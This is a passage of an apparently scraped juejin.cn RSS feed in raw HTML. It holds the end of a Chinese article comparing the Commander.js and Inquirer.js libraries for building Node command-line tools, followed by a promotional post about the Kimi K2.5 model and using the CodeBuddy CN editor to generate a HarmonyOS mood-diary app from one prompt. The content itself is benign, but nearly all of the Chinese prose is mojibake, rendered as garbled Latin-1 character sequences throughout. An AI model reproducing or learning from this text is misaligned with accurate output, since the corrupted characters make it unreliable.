align="left"><strong>è¾ƒå·®</strong>ï¼šé€šå¸¸éœ€è¦äººå·¥å¹²é¢„ï¼ˆé™¤é Mock æ ‡å‡†è¾“å…¥ï¼‰</td></tr><tr><td align="left"><strong>å­¦ä¹ æ›²çº¿</strong></td><td align="left">ä½ï¼šä¸»è¦æ˜¯å£°æ˜ API åŠå…¶å›è°ƒ</td><td align="left">ä¸­ï¼šéœ€å¤„ç†å¼‚æ­¥æµç¨‹ã€é€»è¾‘åˆ†æ”¯å’Œæ ¡éªŒ</td></tr><tr><td align="left"><strong>ç”¨æˆ·ç¾¤ä½“</strong></td><td align="left">é«˜çº§ç”¨æˆ·ï¼ˆåå‘è„šæœ¬åŒ–ã€å¿«é€ŸæŒ‡ä»¤ï¼‰</td><td align="left">æ™®é€šç”¨æˆ·ï¼ˆåå‘é…ç½®å‘å¯¼ã€åˆå§‹åŒ–å·¥å…·ï¼‰</td></tr></tbody></table>
<h3 data-id="heading-9">ç›¸åŒç‚¹</h3>
<ol>
<li><strong>åŸºç¡€ç¯å¢ƒ</strong>ï¼šä¸¤è€…éƒ½è¿è¡Œåœ¨ Node.js ç¯å¢ƒï¼Œå‡å¯¹åŸç”Ÿ <code>process.stdin</code> å’Œ <code>process.stdout</code> è¿›è¡Œäº†é«˜çº§å°è£…ã€‚</li>
<li><strong>ç¤¾åŒºæ ‡å‡†</strong>ï¼šå®ƒä»¬éƒ½æ˜¯å„è‡ªé¢†åŸŸçš„â€œäº‹å®æ ‡å‡†â€ï¼Œnpm ä¸‹è½½é‡å‡ä¸ºåƒä¸‡çº§ã€‚</li>
<li><strong>æ‰©å±•æ€§</strong>ï¼šéƒ½æ”¯æŒè‡ªå®šä¹‰æ‰©å±•ï¼ŒCommander å¯ä»¥è‡ªå®šä¹‰é…ç½® Help ç±»ï¼ŒInquirer å¯ä»¥å¼€å‘è‡ªå®šä¹‰ Prompt æ’ä»¶ã€‚</li>
</ol>
<h3 data-id="heading-10">æ ¸å¿ƒåŒºåˆ«</h3>
<ul>
<li><strong>è§¦å‘æ—¶æœºä¸åŒ</strong>ï¼šCommander å…³æ³¨çš„æ˜¯å‘½ä»¤å¯åŠ¨é‚£ä¸€åˆ»çš„çŠ¶æ€ï¼›Inquirer å…³æ³¨çš„æ˜¯å¯åŠ¨åä¸ç”¨æˆ·çš„æŒç»­å¯¹è¯ã€‚</li>
<li><strong>CI/CD å‹å¥½åº¦ä¸åŒ</strong>ï¼šå¦‚æœä½ çš„å·¥å…·è¦åœ¨æœåŠ¡å™¨è„šæœ¬ï¼ˆå¦‚ Jenkinsï¼‰ä¸­è¿è¡Œï¼ŒCommander æ˜¯å¿…é¡»çš„ï¼Œå› ä¸ºå®ƒå¯ä»¥é€šè¿‡ Flagï¼ˆå¦‚ <code>--yes</code>ï¼‰é¿å¼€äººå·¥å¹²é¢„ï¼›è€Œ Inquirer åœ¨è¿™ç§åœºæ™¯ä¸‹ä¼šé˜»å¡è¿›ç¨‹ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-11">4. æ··åˆé€‰å‹ç­–ç•¥ï¼š1 + 1 &gt; 2</h2>
<p>åœ¨ç°ä»£ CLI å¼€å‘ä¸­ï¼Œ**â€œCommander æ„å»ºéª¨æ¶ + Inquirer å¡«å……äº¤äº’â€**æ˜¯æœ€æˆç†Ÿçš„æ–¹æ¡ˆã€‚</p>
<h3 data-id="heading-12">å®è·µæ¡ˆä¾‹ï¼šè„šæ‰‹æ¶åˆå§‹åŒ–</h3>
<p>æƒ³è±¡ä½ è¦å¼€å‘ä¸€ä¸ªç±»ä¼¼ <code>vue-cli</code> çš„å·¥å…·ï¼š</p>
<ol>
<li><strong>ä½¿ç”¨ Commander è§£ææŒ‡ä»¤</strong>ï¼šç”¨æˆ·è¾“å…¥ <code>my-cli create my-project</code>ã€‚</li>
<li><strong>ç¼ºçœæ£€æµ‹</strong>ï¼šå¦‚æœç”¨æˆ·æ²¡ä¼ å‚æ•°ï¼Œæˆ–è€…éœ€è¦è¿›ä¸€æ­¥é…ç½®ï¼Œåˆ™å”¤èµ· <strong>Inquirer</strong>ã€‚</li>
<li><strong>äº¤äº’å¼é—®ç­”</strong>ï¼šè¯¢é—®â€œæ˜¯å¦ä½¿ç”¨ TypeScriptï¼Ÿâ€ã€â€œæ˜¯å¦é›†æˆ ESLintï¼Ÿâ€ã€‚</li>
<li><strong>ç»“æœåˆå¹¶</strong>ï¼šå°† Commander è§£æçš„åˆå§‹å‚æ•°ä¸ Inquirer æ”¶é›†çš„é…ç½®åˆå¹¶ï¼Œæœ€åæ‰§è¡Œæ–‡ä»¶åˆ›å»ºä»»åŠ¡ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-13">5. ç»“è®ºä¸è¡ŒåŠ¨å»ºè®®</h2>
<p>é’ˆå¯¹ä½ çš„æŠ€æœ¯é€‰å‹ï¼Œæˆ‘ç»™å‡ºä»¥ä¸‹ç»“è®ºï¼š</p>
<ol>
<li><strong>å¦‚æœä½ çš„å·¥å…·ä¸»è¦ç”¨äºè‡ªåŠ¨åŒ–è„šæœ¬ã€æ•°æ®å¤„ç†æˆ–æ‹¥æœ‰å¤§é‡å¤æ‚å‚æ•°</strong>ï¼šè¯·ä¼˜å…ˆç¡®ä¿ <strong>Commander</strong> çš„ç¨³å¥å®ç°ã€‚å®ƒèƒ½è®©ä½ çš„å·¥å…·åƒ <code>ls</code> æˆ– <code>git</code> ä¸€æ ·ä¸“ä¸šä¸”æ˜“äºé›†æˆã€‚</li>
<li><strong>å¦‚æœä½ çš„å·¥å…·ä¸»è¦é¢å‘åˆçº§ç”¨æˆ·ï¼Œæˆ–è€…æ¶‰åŠå¤æ‚çš„åˆå§‹åŒ–é…ç½®ï¼ˆå¦‚è„šæ‰‹æ¶ã€å®‰è£…å‘å¯¼ï¼‰</strong>ï¼š<strong>Inquirer</strong>ï¼ˆæ¨èä½¿ç”¨æ–°ç‰ˆ <code>@inquirer/prompts</code>ï¼‰å°†æå¤§æå‡ç”¨æˆ·ä½“éªŒã€‚</li>
<li><strong>è¡ŒåŠ¨å»ºè®®</strong>ï¼š
<ul>
<li><strong>ç«‹å³å¯åš</strong>ï¼šå®šä¹‰ä½ çš„ CLI æ ¸å¿ƒå‘½ä»¤ç»“æ„ï¼Œä½¿ç”¨ Commander å»ºç«‹ç¬¬ä¸€ä¸ª <code>--help</code>ã€‚</li>
<li><strong>ä¸­æœŸè®¡åˆ’</strong>ï¼šè¯†åˆ«ç”¨æˆ·å®¹æ˜“è¾“é”™æˆ–éš¾ä»¥è®°å¿†çš„å¤æ‚å‚æ•°ï¼Œå°†å…¶è½¬åŒ–ä¸º Inquirer çš„äº¤äº’å¼é—®ç­”æµç¨‹ã€‚</li>
</ul>
</li>
</ol>
<hr/>
<p><strong>å‚è€ƒæ¥æºï¼š</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSBoudrias%2FInquirer.js" target="_blank" title="https://github.com/SBoudrias/Inquirer.js" ref="nofollow noopener noreferrer">Inquirer.js GitHub Repository</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftj%2Fcommander.js" target="_blank" title="https://github.com/tj/commander.js" ref="nofollow noopener noreferrer">Commander.js GitHub Repository</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æœ€å¼ºKimi K2.5 çœŸèƒ½åšåˆ°ä¸€å¥è¯å¼€å‘ä¸€ä¸ªåº”ç”¨ - 3åˆ†é’Ÿç®€å•ä¸Šæ‰‹ä½“éªŒ]]></title>    <link>https://juejin.cn/post/7600318091832197147</link>    <guid>https://juejin.cn/post/7600318091832197147</guid>    <pubDate>2026-01-29T06:24:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600318091832197147" data-draft-id="7600508556124143667" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æœ€å¼ºKimi K2.5 çœŸèƒ½åšåˆ°ä¸€å¥è¯å¼€å‘ä¸€ä¸ªåº”ç”¨ - 3åˆ†é’Ÿç®€å•ä¸Šæ‰‹ä½“éªŒ"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯"/> <meta itemprop="datePublished" content="2026-01-29T06:24:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸‡å°‘"/> <meta itemprop="url" content="https://juejin.cn/user/4441682708283191"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æœ€å¼ºKimi K2.5 çœŸèƒ½åšåˆ°ä¸€å¥è¯å¼€å‘ä¸€ä¸ªåº”ç”¨ - 3åˆ†é’Ÿç®€å•ä¸Šæ‰‹ä½“éªŒ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4441682708283191/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸‡å°‘
  </span> <!----> <!----> <div class="vip-level" data-v-cd7d0a50="" data-v-292f6e48=""><span class="tooltip" data-v-cd7d0a50=""><div class="byte-tooltip byte-tooltip--dark" style="display:none;">
        VIP.5 å¦‚é±¼å¾—æ°´
      </div><span class="byte-tooltip__wrapper"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8AQMAAAAAMksxAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAA5JREFUKM9jGAWjAAcAAAIcAAE27nY6AAAAAElFTkSuQmCC" alt="VIP.5 å¦‚é±¼å¾—æ°´" title="VIP.5 å¦‚é±¼å¾—æ°´" class="lazy" style="aspect-ratio:NaN;" data-v-5244ef91="" data-v-cd7d0a50=""/></span></span></div> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T06:24:06.000Z" title="Thu Jan 29 2026 06:24:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æœ€å¼ºKimi K2.5 çœŸèƒ½åšåˆ°ä¸€å¥è¯å¼€å‘ä¸€ä¸ªåº”ç”¨ - 3åˆ†é’Ÿç®€å•ä¸Šæ‰‹ä½“éªŒ</h2>
<blockquote>
<p><strong>ä¸‡å°‘ï¼šåä¸ºHDEã€é¸¿è’™æå®¢ã€ä¸ªäººç‹¬ç«‹å¼€å‘è€…</strong></p>
<p>ä¸ªäººä¸»é¡µï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.zbztb.cn%2F" target="_blank" title="https://blog.zbztb.cn/" ref="nofollow noopener noreferrer">blog.zbztb.cn/</a></p>
<p><strong>2025å¹´å‚ä¸å­µåŒ–äº†20+é¸¿è’™åº”ç”¨ã€æŠ€æœ¯æ–‡ç« 300+ã€é¸¿è’™çŸ¥è¯†åº“ç”¨æˆ·500+ã€é¸¿è’™å…è´¹è¯¾ç¨‹2å¥—ã€‚</strong></p>
<p>å¦‚æœä½ ä¹Ÿå–œæ¬¢äº¤æµAIå’Œé¸¿è’™æŠ€æœ¯ï¼Œæ¬¢è¿æ‰£æˆ‘ã€‚</p>
</blockquote>
<h3 data-id="heading-1">1æœˆ27æ—¥</h3>
<p>æœˆä¹‹æš—é¢ åœ¨1æœˆ27æ—¥ æ¨å‡ºå·ç§°<strong>è¿„ä»Šä¸ºæ­¢æœ€å¼ºå¤§çš„å¼€æºæ¨¡å‹</strong>Â ã€Š<strong>Kimi K2.5</strong>ã€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f683a8e85dc4ae1b704eae61d02e2c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiH5bCR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770272645&amp;x-signature=src4GufReTjAsuclocHIl8hBwv4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Kimi K2.5 åŸºäºÂ <strong>Kimi K2</strong>Â æ„å»ºï¼Œé€šè¿‡çº¦Â <strong>15T</strong>Â æ··åˆè§†è§‰å’Œæ–‡æœ¬Â <strong>token</strong>Â çš„æŒç»­é¢„è®­ç»ƒã€‚</p>
<p>ä½œä¸ºåŸç”Ÿå¤šæ¨¡æ€æ¨¡å‹ï¼ŒK2.5 æä¾›äº†æœ€å…ˆè¿›çš„ç¼–ç å’Œè§†è§‰èƒ½åŠ›ï¼Œä»¥åŠè‡ªå¯¼å‘çš„ä»£ç†ç¾¤èŒƒå¼ã€‚</p>
<p>å¯¹äºå¤æ‚ä»»åŠ¡ï¼Œ<strong>Kimi K2.5 å¯ä»¥è‡ªå¯¼å‘ä¸€ä¸ªæœ€å¤šåŒ…å« 100 ä¸ªå­ä»£ç†çš„ä»£ç†ç¾¤ï¼Œæ‰§è¡Œè·¨è¶Šæœ€å¤š 1,500 ä¸ªå·¥å…·è°ƒç”¨çš„å¹¶è¡Œå·¥ä½œæµ</strong>ã€‚</p>
<p>ä¸å•ä»£ç†è®¾ç½®ç›¸æ¯”ï¼Œ<strong>è¿™å¯å°†æ‰§è¡Œæ—¶é—´ç¼©çŸ­é«˜è¾¾ 4.5 å€</strong>ã€‚</p>
<p>ä»£ç†ç¾¤ç”± Kimi K2.5 è‡ªåŠ¨åˆ›å»ºå’Œç¼–æ’ï¼Œæ— éœ€ä»»ä½•é¢„å®šä¹‰çš„å­ä»£ç†æˆ–å·¥ä½œæµã€‚</p>
<hr/>
<p>100å¤šä¸ªå­ä»£ç†ï¼Œè¿™ä¸å°±æ˜¯ä¸€å †ä¸“å®¶å›´ç€ä½ è½¬äº†å—ï¼Ÿ</p>
<p>æƒ³è±¡ä¸€ä¸ªåœºæ™¯:</p>
<p>ä½ è¿›åˆ°äº†é¥­åº—ç‚¹ä¸€ç›˜<strong>é±¼é¦™è‚‰ä¸</strong>ï¼š</p>
<ol>
<li><strong>æœ‰å†œä¸šä¸“å®¶å¸®ä½ é€‰æ‹©æœ€å¥½çš„é£Ÿæ</strong></li>
<li><strong>æœ‰è¥å…»ä¸“å®¶å¸®ä½ æ­é…æœ€åˆé€‚çš„é£Ÿææ¯”ä¾‹</strong></li>
<li><strong>æœ‰å¤§å¨å¸ˆå¸®ä½ çƒ¹é¥ªæœ€ç¾å‘³çš„é£Ÿç‰©</strong></li>
<li><strong>æœ‰è‰ºæœ¯å®¶å¸®ä½ åšæœ€ç²¾ç¾çš„æ‘†ç›˜</strong></li>
<li><strong>æœ‰éŸ³ä¹å®¶å¸®ä½ åœ¨æ—è¾¹å¥ä¹</strong></li>
<li>ã€‚ã€‚ã€‚</li>
</ol>
<p>è¿˜æœ‰å¾ˆå¤šä¸“å®¶å›´ç»•ä½ çš„éœ€æ±‚å»æœåŠ¡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb85d327c3d24a89838552514162c0b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiH5bCR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770272645&amp;x-signature=0AO9GMrEgsry9G4xpcxiYAKLkfE%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-2">èƒ½åŠ›å¯¹æ¯”</h3>
<p>Kimi K2.5 å¯é€šè¿‡ Kimi.comã€Kimi Appã€API å’Œ Kimi Code è·å–ã€‚</p>
<p>Kimi.com &amp; Kimi App ç°åœ¨æ”¯æŒ 4 ç§æ¨¡å¼ï¼šK2.5 å³æ—¶æ¨¡å¼ã€K2.5 æ€è€ƒæ¨¡å¼ã€K2.5 ä»£ç†æ¨¡å¼å’Œ K2.5 ä»£ç†ç¾¤ï¼ˆBeta ç‰ˆï¼‰ã€‚</p>
<p>ä»£ç†ç¾¤ç›®å‰åœ¨ Kimi.com ä¸Šå¤„äº Beta æµ‹è¯•é˜¶æ®µï¼Œé«˜ç­‰çº§ä»˜è´¹ç”¨æˆ·å¯å…è´¹ä½¿ç”¨ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f0650a3cb2c463b9669a78694f8b6fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiH5bCR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770272645&amp;x-signature=r1nqMGNfolzn%2BkF2ACT5Qj4mznc%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¯ä»¥çœ‹åˆ°å’Œå›½å¤–é¡¶å°–çš„å¤§æ¨¡å‹ç›¸æ¯”ä¹Ÿæ˜¯æ¯«ä¸é€Šè‰²ã€‚</p>
<h3 data-id="heading-3">å¦‚ä½•ä½“éªŒ</h3>
<p>å¤§å®¶å¦‚æœæƒ³è¦ç®€å•ä½“éªŒä¸€ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨è…¾è®¯çš„<strong>CodeBuddy CN</strong>ï¼Œå®ƒå·²ç»å†…ç½®äº†K2.5æ¨¡å‹ï¼Œå¯ä»¥é€šè¿‡AIç¼–è¾‘å™¨ç®€å•æ„Ÿå—ä¸€ä¸‹ç¼–ç¨‹çš„èƒ½åŠ›ã€‚</p>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcopilot.tencent.com%2Fpromotion%2F%3Fref%3Dvlt2x31eyhp8a1" target="_blank" title="https://copilot.tencent.com/promotion/?ref=vlt2x31eyhp8a1" ref="nofollow noopener noreferrer">copilot.tencent.com/promotion/?â€¦</a></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c40be741e4d34c3ab9d986cc82cf1dac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiH5bCR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770272645&amp;x-signature=lRs%2Btuew3hCtxRE1SvYE%2BPtkbZc%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¦‚æœæƒ³è¦æ„Ÿå— 100ä¸ªä»£ç†ï¼ˆç‰›é©¬ï¼‰ç»™ä½ æœåŠ¡çš„æ„Ÿè§‰ï¼Œä½ å¯ä»¥åœ¨Kimiå®˜ç½‘ä¸Šå»ä½“éªŒä¸€ä¸‹ã€‚</p>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.kimi.com%2Fagent-swarm" target="_blank" title="https://www.kimi.com/agent-swarm" ref="nofollow noopener noreferrer">www.kimi.com/agent-swarm</a></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d51575b805d94fb688d63c3dd6ee6daa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiH5bCR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770272645&amp;x-signature=qmfIxPctWgf1Vr453HPetzEFS%2Bg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ç›®å‰æ–°ä¸šåŠ¡è¥ä¸šå¤§é…¬å®¾ ï¿¥4.99 å¯ä»¥äº«å—7å¤©çš„ä½¿ç”¨ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb3c6cec33d34e40a6f2a5795a18e35b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiH5bCR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770272645&amp;x-signature=cJzHM6tGgy7uMo9kkKR9G6Au5lA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-4">ä¸€å¥è¯ç”Ÿæˆåº”ç”¨</h3>
<p>å›åˆ°<strong>CodeBuddy CN</strong>ç¼–è¾‘å™¨å†…ï¼Œæ‰“å¼€å¯¹è¯æ¡†ï¼Œè¾“å…¥ä»¥ä¸‹æç¤ºè¯ï¼š</p>
<blockquote>
<p>å¸®æˆ‘åšä¸€ä¸ªå•æœºç‰ˆæœ¬çš„ HarmonyOSåº”ç”¨å•æœºå”¯ç¾é£æ ¼ï¼Œä¸»é¢˜æ˜¯ æ—¶å…‰å¿ƒæƒ…ç°¿ã€‚</p>
<p>1é¦–å±ä¸Šæ˜¯ 4ä¸ªtabï¼Œåˆ†åˆ«æ˜¯é¦–é¡µ-è®°å½•-ç»Ÿè®¡-æˆ‘çš„ 1 é¦–é¡µæ˜¯ä¸€ä¸ªé€æ˜æœ‰è¾¹æ¡†çš„å­˜é’±ç½ï¼Œç‚¹å‡»ä¸åŒçš„å¿ƒæƒ…å›¾æ ‡å¯ä»¥å¾€å­˜é’±ç½é‡Œé¢å­˜å›¾æ ‡ï¼Œå›¾æ ‡ä¸‹è½è¦æœ‰åŠ¨ç”»æ•ˆæœï¼Œå­˜é’±ç½åœ¨ç“¶å­é‡Œä¹Ÿæœ‰æœ‰çœŸå®çš„ç¢°æ’æ•ˆæœ</p>
<p>2 è®°å½•é¡µé¢æ˜¯ä¸€ä¸ªå¯ä»¥æ ¹æ®æ—¥å†æ¥æ·»åŠ å¿ƒæƒ…çŠ¶æ€çš„é¡µé¢ï¼Œæ¥å—ä¸Šä¼ æœ€å¤š3ç« å›¾ç‰‡</p>
<p>3 ç»Ÿè®¡ä½¿ç”¨å¥½çœ‹çš„å›¾æ ‡æŠ€æœ¯ï¼Œå¯ä»¥å®ç°æŒ‰ç…§å¹´ã€æœˆã€æ—¥ã€ä¸åŒçš„å¿ƒæƒ…ç§ç±»å¼€å§‹ç»Ÿè®¡</p>
<p>4 æˆ‘çš„ é¡µé¢æä¾›å¸¸è§çš„ä¸€äº›åŠŸèƒ½ï¼Œæ¯”å¦‚è®¾ç½®é£æ ¼ã€å­—ä½“å¤§å°ã€éœ‡åŠ¨ç­‰ç­‰ æ‰€æœ‰é¡µé¢è®¾è®¡éƒ½è¦æœ‰å¥½çœ‹çš„è¿‡æ¸¡åŠ¨ç”»ï¼Œä¸€äº›é¡µé¢ä¹Ÿå¯ä»¥åŠ å…¥ä½ æ‰¾åˆ°çš„å…è´¹çš„èƒŒæ™¯å›¾</p>
</blockquote>
<p><strong>CodeBuddy CN</strong>ä¼šå¸®æˆ‘åˆ¶å®šè®¡åˆ’ï¼Œç¡®è®¤æ— è¯¯åï¼Œå¼€å§‹å¹²æ´»ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/59433c7a19f5480ab72e1283c55e1639~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiH5bCR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770272645&amp;x-signature=%2F099NrmsU6rSTJVlUbq7QFtBhO4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-5">æœ€ç»ˆæ•ˆæœ</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3407d10915c0410f8503306c3c01089c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiH5bCR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770272645&amp;x-signature=QxHOjog9Dgnkig69%2BFb1Iu7sBxs%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
